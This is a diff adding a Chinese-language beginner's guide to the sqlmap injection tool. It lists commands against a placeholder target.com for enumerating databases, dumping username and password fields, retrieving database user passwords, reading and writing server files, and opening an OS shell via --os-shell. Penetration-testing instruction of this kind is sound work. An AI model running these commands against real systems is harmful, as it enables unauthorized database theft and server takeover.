@@ -1,4 +1,79 @@
-## temper 介绍
+# sqlmap入门
+## 一、获取数据命令
+1. 判断是否存在注入
+
+        sqlmap.py -u http://target.com
+2. 判断文中请求是否存在注入
+
+       sqlmap.py -r target.txt
+3. 查询当前用户下的所有数据库
+
+        sqlmap.py -u http://target.com --dbs
+4. 获取数据库中的表名
+
+        sqlmap.py -u http://target.com -D database --tables
+5. 获取表中的字段名
+
+        sqlmap.py -u http://target.com -D database -T tables --columns
+5. 获取字段内容
+
+       sqlmap.py -u http://target.com -D database -T tables -C username,password --dump
+6. 获取数据库的所有用户
+
+       sqlmap.py -u http://target.com --users
+7. 获取数据库用户密码
+
+       sqlmap.py -u http://target.com --passwords
+8. 获取当前网站数据库的名称
+
+        sqlmap.py -u http://target.com --current-db
+9. 获取当前网站数据库的用户名称
+
+       sqlmap.py -u http://target.com --current-user
+
+
+## 二、常用参数讲解
+1. --level 探测等级
+
+    1-5个等级，5级payload探测最多。2级会测cookie，3级会测User-Agent/Referer头。
+
+       sqlmap.py -u http://target.com --leve 3
+2. --is-dba
+
+    判断当前用户是否为管理员权限
+
+       sqlmap.py -u http://target.com --is-dba
+3. --roles
+
+    列出数据库管理员角色
+
+        sqlmap.py -u http://target.com --roles
+4. --referer
+     
+     SQLMap可以在请求中伪造HTTP中的referer，当--level参数为3时，会对referer注入。可以使用referer命令来欺骗。
+     
+       sqlmap.py -u http://target.com --referer http://www.baidu.com
+5. --sql-shell
+     运行自定义SQL语句
+
+        sqlmap.py -u http://target.com --sql-shell
+        然后出现交互页面来运行自定义语句。
+6. --os-shell,--os-cmd
+
+     运行任意操作系统命令
+
+       sqlmap.py -u http://target.com --os-shell
+7. --file-read
+    
+    从数据库服务器中读取文件
+
+        sqlmap.py -u http://target.com --file-read "C:/example.txt"
+8. --file-write,--file-dest
+
+     上传文件到数据库服务器中
+
+
+## 三、temper 介绍
 1. apostrophemask.py
 
          功能：对引号进行utf-8格式编码(%EF%BC%87)
